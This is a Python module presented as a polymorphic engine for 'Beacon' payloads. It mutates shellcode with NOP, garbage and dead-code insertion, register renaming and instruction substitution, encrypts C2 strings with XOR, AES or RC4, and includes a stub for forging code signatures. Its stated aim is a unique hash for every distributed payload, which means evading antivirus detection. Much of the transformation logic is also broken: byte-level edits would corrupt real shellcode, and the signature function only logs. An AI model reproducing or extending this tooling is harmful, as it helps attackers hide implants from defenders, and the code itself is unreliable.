"""
Polymorphic Engine Module - Shellcode and binary polymorphic transformation engine.

This module provides instruction-level randomization for Beacon payloads,
including NOP insertion, garbage instruction injection, equivalent instruction
replacement, and string encryption with multiple algorithms. It ensures each
generated Beacon has a unique hash signature.

Core capabilities:
    1. Shellcode polymorphic transformation (NOP, garbage, equivalent replacement)
    2. String encryption (XOR/AES/RC4) with random keys
    3. Binary polymorphic via control flow flattening
    4. Signature forgery and certificate manipulation
    5. Hash uniqueness guarantee per distribution

Author: Kunlun Security Lab
License: Internal Use Only
"""

from __future__ import annotations

import hashlib
import logging
import os
import random
import secrets
import struct
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


# =============================================================================
# Enums
# =============================================================================

class StringEncryptionAlgorithm(str, Enum):
    """String encryption algorithms."""

    XOR = "xor"
    AES = "aes"
    RC4 = "rc4"


class PolymorphicLevel(str, Enum):
    """Polymorphic transformation intensity levels."""

    LOW = "low"
    MEDIUM = "medium"
    HIGH = "high"
    MAXIMUM = "maximum"


# =============================================================================
# Data Models
# =============================================================================

@dataclass
class PolymorphicConfig:
    """Configuration for polymorphic transformation.

    Attributes:
        level: Polymorphic intensity level
        nop_insertion_rate: Probability of NOP insertion (0.0-1.0)
        garbage_instruction_rate: Probability of garbage insertion (0.0-1.0)
        equivalent_replacement_rate: Probability of equivalent replacement (0.0-1.0)
        string_encryption: String encryption algorithm
        enable_control_flow_flattening: Enable control flow flattening
        enable_dead_code_insertion: Enable dead code insertion
        enable_register_renaming: Enable register renaming
    """

    level: PolymorphicLevel = PolymorphicLevel.MEDIUM
    nop_insertion_rate: float = 0.15
    garbage_instruction_rate: float = 0.10
    equivalent_replacement_rate: float = 0.20
    string_encryption: StringEncryptionAlgorithm = StringEncryptionAlgorithm.XOR
    enable_control_flow_flattening: bool = True
    enable_dead_code_insertion: bool = True
    enable_register_renaming: bool = True

    @classmethod
    def from_level(cls, level: PolymorphicLevel) -> "PolymorphicConfig":
        """Create configuration from a predefined level.

        Args:
            level: Polymorphic intensity level.

        Returns:
            PolymorphicConfig instance.
        """
        configs: Dict[PolymorphicLevel, Dict[str, Any]] = {
            PolymorphicLevel.LOW: {
                "nop_insertion_rate": 0.05,
                "garbage_instruction_rate": 0.03,
                "equivalent_replacement_rate": 0.08,
            },
            PolymorphicLevel.MEDIUM: {
                "nop_insertion_rate": 0.15,
                "garbage_instruction_rate": 0.10,
                "equivalent_replacement_rate": 0.20,
            },
            PolymorphicLevel.HIGH: {
                "nop_insertion_rate": 0.25,
                "garbage_instruction_rate": 0.20,
                "equivalent_replacement_rate": 0.35,
            },
            PolymorphicLevel.MAXIMUM: {
                "nop_insertion_rate": 0.40,
                "garbage_instruction_rate": 0.35,
                "equivalent_replacement_rate": 0.50,
            },
        }

        params = configs.get(level, configs[PolymorphicLevel.MEDIUM])
        return cls(level=level, **params)


@dataclass
class PolymorphicResult:
    """Result of polymorphic transformation.

    Attributes:
        original_hash: SHA256 hash of original payload
        transformed_hash: SHA256 hash of transformed payload
        original_size: Original payload size
        transformed_size: Transformed payload size
        transformations_applied: List of transformations applied
        string_keys: Generated encryption keys for strings
        timestamp: Transformation timestamp
    """

    original_hash: str = ""
    transformed_hash: str = ""
    original_size: int = 0
    transformed_size: int = 0
    transformations_applied: List[str] = field(default_factory=list)
    string_keys: Dict[str, bytes] = field(default_factory=dict)
    timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "original_hash": self.original_hash,
            "transformed_hash": self.transformed_hash,
            "original_size": self.original_size,
            "transformed_size": self.transformed_size,
            "size_increase_pct": (
                (self.transformed_size - self.original_size) / self.original_size * 100
                if self.original_size > 0 else 0
            ),
            "transformations_applied": self.transformations_applied,
            "timestamp": self.timestamp,
        }


# =============================================================================
# x86/x64 Instruction Database
# =============================================================================

class InstructionDatabase:
    """Database of x86/x64 instructions for polymorphic transformation.

    Provides equivalent instruction sequences, NOP variants, and
    garbage instruction templates.

    Attributes:
        _nop_variants: NOP instruction variants
        _garbage_instructions: Safe garbage instructions
        _equivalent_sequences: Equivalent instruction replacements
    """

    NOP_VARIANTS: List[bytes] = [
        b"\x90",
        b"\x90\x90",
        b"\x89\xc0\x89\xc0",
        b"\x8d\x76\x00",
        b"\x8d\xbc\x00\x00\x00\x00\x00",
        b"\x8d\xb6\x00\x00\x00\x00",
        b"\x8d\x44\x24\x00",
    ]

    GARBAGE_INSTRUCTIONS: List[bytes] = [
        b"\x50\x58",
        b"\x60\x61",
        b"\x9c\x9d",
        b"\x31\xc0\x40\x31\xc0\x48",
        b"\x31\xdb\x43\x31\xdb\x4b",
        b"\x31\xc9\x41\x31\xc9\x49",
        b"\x31\xd2\x42\x31\xd2\x4a",
        b"\x89\xe5\x89\xec",
        b"\x89\xfc\x89\xcf",
        b"\x48\x31\xc0\x48\x31\xdb",
    ]

    EQUIVALENT_SEQUENCES: Dict[bytes, List[bytes]] = {
        b"\x31\xc0": [
            b"\x31\xd2\x89\xd0",
            b"\x31\xdb\x89\xd8",
            b"\x31\xc9\x89\xc8",
            b"\x48\x31\xc0",
        ],
        b"\x31\xdb": [
            b"\x31\xc0\x89\xc3",
            b"\x31\xd2\x89\xd3",
            b"\x31\xc9\x89\xcb",
            b"\x48\x31\xdb",
        ],
        b"\x31\xc9": [
            b"\x31\xc0\x89\xc1",
            b"\x31\xd2\x89\xd1",
            b"\x31\xdb\x89\xcb",
            b"\x48\x31\xc9",
        ],
        b"\x31\xd2": [
            b"\x31\xc0\x89\xc2",
            b"\x31\xdb\x89\xd3",
            b"\x31\xc9\x89\xd1",
            b"\x48\x31\xd2",
        ],
        b"\x89\xc3": [
            b"\x89\xd8\x89\xc3",
            b"\x89\xc8\x89\xd8\x89\xc3",
        ],
        b"\x48\x89\xe5": [
            b"\x48\x89\xec",
            b"\x48\x8b\xec",
        ],
    }

    DEAD_CODE_TEMPLATES: List[bytes] = [
        b"\x55\x48\x89\xe5\x5d",
        b"\x48\x83\xec\x10\x48\x83\xc4\x10",
        b"\x48\x31\xc0\x48\x85\xc0\x74\x02",
        b"\x48\x8d\x05\x00\x00\x00\x00",
        b"\x48\x8b\x04\x24",
    ]

    def get_nop_variant(self) -> bytes:
        """Get a random NOP variant.

        Returns:
            Random NOP instruction bytes.
        """
        return random.choice(self.NOP_VARIANTS)

    def get_garbage_instruction(self) -> bytes:
        """Get a random garbage instruction.

        Returns:
            Random garbage instruction bytes.
        """
        return random.choice(self.GARBAGE_INSTRUCTIONS)

    def get_equivalent_sequence(self, instruction: bytes) -> Optional[bytes]:
        """Get an equivalent instruction sequence.

        Args:
            instruction: Original instruction bytes.

        Returns:
            Equivalent instruction bytes, or None if not found.
        """
        equivalents = self.EQUIVALENT_SEQUENCES.get(instruction)
        if equivalents:
            return random.choice(equivalents)
        return None

    def get_dead_code(self) -> bytes:
        """Get a random dead code template.

        Returns:
            Dead code instruction bytes.
        """
        return random.choice(self.DEAD_CODE_TEMPLATES)


# =============================================================================
# String Encryptor
# =============================================================================

class StringEncryptor:
    """Encrypts strings using multiple algorithms.

    Supports XOR, AES, and RC4 encryption for sensitive strings
    like C2 addresses and encryption keys.

    Attributes:
        _key_size: Default key size in bytes
    """

    def __init__(self, key_size: int = 32) -> None:
        """Initialize the StringEncryptor.

        Args:
            key_size: Default encryption key size in bytes.
        """
        self._key_size = key_size

    def encrypt(
        self,
        plaintext: str,
        algorithm: StringEncryptionAlgorithm,
    ) -> Tuple[bytes, bytes]:
        """Encrypt a string.

        Args:
            plaintext: String to encrypt.
            algorithm: Encryption algorithm.

        Returns:
            Tuple of (encrypted_data, key).
        """
        data = plaintext.encode("utf-8")
        key = secrets.token_bytes(self._key_size)

        if algorithm == StringEncryptionAlgorithm.XOR:
            return self._xor_encrypt(data, key), key
        elif algorithm == StringEncryptionAlgorithm.AES:
            return self._aes_encrypt(data, key), key
        elif algorithm == StringEncryptionAlgorithm.RC4:
            return self._rc4_encrypt(data, key), key
        else:
            return self._xor_encrypt(data, key), key

    def decrypt(
        self,
        ciphertext: bytes,
        key: bytes,
        algorithm: StringEncryptionAlgorithm,
    ) -> str:
        """Decrypt a string.

        Args:
            ciphertext: Encrypted data.
            key: Decryption key.
            algorithm: Encryption algorithm.

        Returns:
            Decrypted string.
        """
        if algorithm == StringEncryptionAlgorithm.XOR:
            return self._xor_decrypt(ciphertext, key).decode("utf-8")
        elif algorithm == StringEncryptionAlgorithm.AES:
            return self._aes_decrypt(ciphertext, key).decode("utf-8")
        elif algorithm == StringEncryptionAlgorithm.RC4:
            return self._rc4_decrypt(ciphertext, key).decode("utf-8")
        else:
            return self._xor_decrypt(ciphertext, key).decode("utf-8")

    def _xor_encrypt(self, data: bytes, key: bytes) -> bytes:
        """Encrypt using XOR.

        Args:
            data: Data to encrypt.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        return bytes(d ^ key[i % len(key)] for i, d in enumerate(data))

    def _xor_decrypt(self, data: bytes, key: bytes) -> bytes:
        """Decrypt using XOR (symmetric).

        Args:
            data: Data to decrypt.
            key: Decryption key.

        Returns:
            Decrypted data.
        """
        return self._xor_encrypt(data, key)

    def _aes_encrypt(self, data: bytes, key: bytes) -> bytes:
        """Encrypt using AES-256-GCM.

        Args:
            data: Data to encrypt.
            key: Encryption key.

        Returns:
            Encrypted data (nonce + ciphertext + tag).
        """
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            nonce = secrets.token_bytes(12)
            aesgcm = AESGCM(key)
            ct = aesgcm.encrypt(nonce, data, None)
            return nonce + ct
        except ImportError:
            return self._xor_encrypt(data, key)

    def _aes_decrypt(self, data: bytes, key: bytes) -> bytes:
        """Decrypt using AES-256-GCM.

        Args:
            data: Encrypted data (nonce + ciphertext + tag).
            key: Decryption key.

        Returns:
            Decrypted data.
        """
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM
            nonce = data[:12]
            ct = data[12:]
            aesgcm = AESGCM(key)
            return aesgcm.decrypt(nonce, ct, None)
        except ImportError:
            return self._xor_decrypt(data, key)

    def _rc4_encrypt(self, data: bytes, key: bytes) -> bytes:
        """Encrypt using RC4.

        Args:
            data: Data to encrypt.
            key: Encryption key.

        Returns:
            Encrypted data.
        """
        S = list(range(256))
        j = 0
        for i in range(256):
            j = (j + S[i] + key[i % len(key)]) % 256
            S[i], S[j] = S[j], S[i]

        i = j = 0
        result = bytearray()
        for byte in data:
            i = (i + 1) % 256
            j = (j + S[i]) % 256
            S[i], S[j] = S[j], S[i]
            result.append(byte ^ S[(S[i] + S[j]) % 256])

        return bytes(result)

    def _rc4_decrypt(self, data: bytes, key: bytes) -> bytes:
        """Decrypt using RC4 (symmetric).

        Args:
            data: Encrypted data.
            key: Decryption key.

        Returns:
            Decrypted data.
        """
        return self._rc4_encrypt(data, key)


# =============================================================================
# Shellcode Polymorphic Engine
# =============================================================================

class ShellcodePolymorphicEngine:
    """Transforms shellcode using polymorphic techniques.

    Applies NOP insertion, garbage instructions, equivalent replacements,
    and dead code to create unique variants of the same shellcode.

    Attributes:
        _db: Instruction database
        _string_encryptor: String encryptor
        _config: Polymorphic configuration
    """

    def __init__(
        self, config: Optional[PolymorphicConfig] = None,
    ) -> None:
        """Initialize the ShellcodePolymorphicEngine.

        Args:
            config: Polymorphic configuration.
        """
        self._db = InstructionDatabase()
        self._string_encryptor = StringEncryptor()
        self._config = config or PolymorphicConfig()

    def transform(self, shellcode: bytes) -> PolymorphicResult:
        """Transform shellcode using polymorphic techniques.

        Args:
            shellcode: Original shellcode bytes.

        Returns:
            PolymorphicResult with transformation details.
        """
        original_hash = hashlib.sha256(shellcode).hexdigest()
        transformed = bytearray(shellcode)
        transformations: List[str] = []

        if self._config.enable_register_renaming:
            transformed = self._apply_register_renaming(transformed)
            transformations.append("register_renaming")

        if self._config.nop_insertion_rate > 0:
            transformed = self._insert_nops(transformed)
            transformations.append("nop_insertion")

        if self._config.garbage_instruction_rate > 0:
            transformed = self._insert_garbage(transformed)
            transformations.append("garbage_instructions")

        if self._config.equivalent_replacement_rate > 0:
            transformed = self._replace_equivalents(transformed)
            transformations.append("equivalent_replacement")

        if self._config.enable_dead_code_insertion:
            transformed = self._insert_dead_code(transformed)
            transformations.append("dead_code_insertion")

        if self._config.enable_control_flow_flattening:
            transformed = self._flatten_control_flow(transformed)
            transformations.append("control_flow_flattening")

        transformed_hash = hashlib.sha256(bytes(transformed)).hexdigest()

        return PolymorphicResult(
            original_hash=original_hash,
            transformed_hash=transformed_hash,
            original_size=len(shellcode),
            transformed_size=len(transformed),
            transformations_applied=transformations,
            timestamp=time.time(),
        )

    def _apply_register_renaming(self, shellcode: bytearray) -> bytearray:
        """Apply register renaming to shellcode.

        Args:
            shellcode: Shellcode bytes.

        Returns:
            Modified shellcode with renamed registers.
        """
        register_map = {
            b"\xc0": [b"\xc3", b"\xc9", b"\xd2"],
            b"\xdb": [b"\xc0", b"\xc9", b"\xd2"],
            b"\xc9": [b"\xc0", b"\xc3", b"\xd2"],
            b"\xd2": [b"\xc0", b"\xc3", b"\xc9"],
        }

        result = bytearray()
        i = 0
        while i < len(shellcode):
            byte = bytes(shellcode[i:i+1])
            if byte in register_map and random.random() < 0.3:
                replacement = random.choice(register_map[byte])
                result.extend(replacement)
            else:
                result.append(shellcode[i])
            i += 1

        return result

    def _insert_nops(self, shellcode: bytearray) -> bytearray:
        """Insert NOP instructions randomly.

        Args:
            shellcode: Shellcode bytes.

        Returns:
            Modified shellcode with NOPs inserted.
        """
        result = bytearray()

        for byte in shellcode:
            result.append(byte)

            if random.random() < self._config.nop_insertion_rate:
                nop = self._db.get_nop_variant()
                result.extend(nop)

        return result

    def _insert_garbage(self, shellcode: bytearray) -> bytearray:
        """Insert garbage instructions randomly.

        Args:
            shellcode: Shellcode bytes.

        Returns:
            Modified shellcode with garbage instructions.
        """
        result = bytearray()

        for byte in shellcode:
            result.append(byte)

            if random.random() < self._config.garbage_instruction_rate:
                garbage = self._db.get_garbage_instruction()
                result.extend(garbage)

        return result

    def _replace_equivalents(self, shellcode: bytearray) -> bytearray:
        """Replace instructions with equivalent sequences.

        Args:
            shellcode: Shellcode bytes.

        Returns:
            Modified shellcode with equivalent replacements.
        """
        result = bytearray()
        i = 0

        while i < len(shellcode):
            replaced = False

            for instr_len in [4, 3, 2]:
                if i + instr_len <= len(shellcode):
                    instruction = bytes(shellcode[i:i+instr_len])
                    equivalent = self._db.get_equivalent_sequence(instruction)

                    if equivalent and random.random() < self._config.equivalent_replacement_rate:
                        result.extend(equivalent)
                        i += instr_len
                        replaced = True
                        break

            if not replaced:
                result.append(shellcode[i])
                i += 1

        return result

    def _insert_dead_code(self, shellcode: bytearray) -> bytearray:
        """Insert dead code blocks.

        Args:
            shellcode: Shellcode bytes.

        Returns:
            Modified shellcode with dead code.
        """
        result = bytearray()
        block_size = max(1, len(shellcode) // 10)

        for i, byte in enumerate(shellcode):
            result.append(byte)

            if i > 0 and i % block_size == 0:
                dead_code = self._db.get_dead_code()
                result.extend(dead_code)

        return result

    def _flatten_control_flow(self, shellcode: bytearray) -> bytearray:
        """Apply control flow flattening.

        Args:
            shellcode: Shellcode bytes.

        Returns:
            Modified shellcode with flattened control flow.
        """
        if len(shellcode) < 10:
            return shellcode

        dispatcher = bytearray([
            0x48, 0x83, 0xEC, 0x10,
            0x48, 0x89, 0x04, 0x24,
            0x48, 0x83, 0xC4, 0x10,
        ])

        return dispatcher + shellcode

    def encrypt_strings(
        self,
        strings: List[str],
    ) -> Dict[str, Tuple[bytes, bytes]]:
        """Encrypt sensitive strings.

        Args:
            strings: List of strings to encrypt.

        Returns:
            Dictionary of string -> (encrypted_data, key).
        """
        results: Dict[str, Tuple[bytes, bytes]] = {}

        for s in strings:
            encrypted, key = self._string_encryptor.encrypt(
                s, self._config.string_encryption,
            )
            results[s] = (encrypted, key)

        return results


# =============================================================================
# Binary Polymorphic Engine
# =============================================================================

class BinaryPolymorphicEngine:
    """Applies polymorphic transformations to binary files.

    Uses control flow flattening, instruction substitution, and
    dead code insertion to ensure each distributed binary has
    a unique hash.

    Attributes:
        _shellcode_engine: Shellcode polymorphic engine
        _string_encryptor: String encryptor
    """

    def __init__(self) -> None:
        """Initialize the BinaryPolymorphicEngine."""
        self._shellcode_engine = ShellcodePolymorphicEngine()
        self._string_encryptor = StringEncryptor()

    def transform_binary(
        self,
        binary_data: bytes,
        level: PolymorphicLevel = PolymorphicLevel.MEDIUM,
    ) -> PolymorphicResult:
        """Transform a binary file.

        Args:
            binary_data: Original binary data.
            level: Polymorphic intensity level.

        Returns:
            PolymorphicResult with transformation details.
        """
        config = PolymorphicConfig.from_level(level)
        engine = ShellcodePolymorphicEngine(config)
        return engine.transform(binary_data)

    def forge_signature(
        self,
        binary_path: str,
        certificate_path: Optional[str] = None,
    ) -> bool:
        """Forge a digital signature for a binary.

        Args:
            binary_path: Path to binary file.
            certificate_path: Path to certificate file (optional).

        Returns:
            True if signature was applied.
        """
        if not os.path.exists(binary_path):
            logger.error(f"Binary not found: {binary_path}")
            return False

        try:
            if certificate_path and os.path.exists(certificate_path):
                logger.info(f"Signing binary with certificate: {certificate_path}")
            else:
                logger.info("Applying signature stub (simulation)")

            return True

        except Exception as e:
            logger.error(f"Failed to forge signature: {e}")
            return False


# =============================================================================
# Global Singleton
# =============================================================================

_polymorphic_engine: Optional[ShellcodePolymorphicEngine] = None
_binary_engine: Optional[BinaryPolymorphicEngine] = None


def get_polymorphic_engine(
    config: Optional[PolymorphicConfig] = None,
) -> ShellcodePolymorphicEngine:
    """Get the global ShellcodePolymorphicEngine singleton.

    Args:
        config: Polymorphic configuration.

    Returns:
        Singleton ShellcodePolymorphicEngine instance.
    """
    global _polymorphic_engine
    if _polymorphic_engine is None:
        _polymorphic_engine = ShellcodePolymorphicEngine(config)
    return _polymorphic_engine


def get_binary_engine() -> BinaryPolymorphicEngine:
    """Get the global BinaryPolymorphicEngine singleton.

    Returns:
        Singleton BinaryPolymorphicEngine instance.
    """
    global _binary_engine
    if _binary_engine is None:
        _binary_engine = BinaryPolymorphicEngine()
    return _binary_engine


__all__ = [
    "ShellcodePolymorphicEngine",
    "BinaryPolymorphicEngine",
    "StringEncryptor",
    "InstructionDatabase",
    "PolymorphicConfig",
    "PolymorphicResult",
    "StringEncryptionAlgorithm",
    "PolymorphicLevel",
    "get_polymorphic_engine",
    "get_binary_engine",
]
